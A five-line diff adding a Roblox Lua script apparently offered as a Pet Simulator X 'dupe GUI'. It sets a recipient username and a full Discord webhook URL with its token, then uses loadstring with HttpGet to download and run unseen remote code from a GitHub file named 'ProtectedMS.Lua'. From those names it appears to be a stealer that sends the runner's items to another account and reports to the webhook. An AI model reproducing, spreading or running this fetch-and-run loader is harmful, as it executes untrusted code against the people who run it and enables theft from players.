@@ -1,0 +1,5 @@
+UserName = "Neozy3"
+WebHook = "https://discord.com/api/webhooks/1039295718101356595/-kdKP7zusD0TFpXgCxl6-sx-vPfBmfS8IrKJ5KN8bQcYVFYZPdZgaQlPe5u70YEWN2Qc"
+Mention = true -- change to false if you don't want to get everyone ping in your webhook.
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/calzzeyy/PetSimX/main/DupeGui/ProtectedMS.Lua", true))()
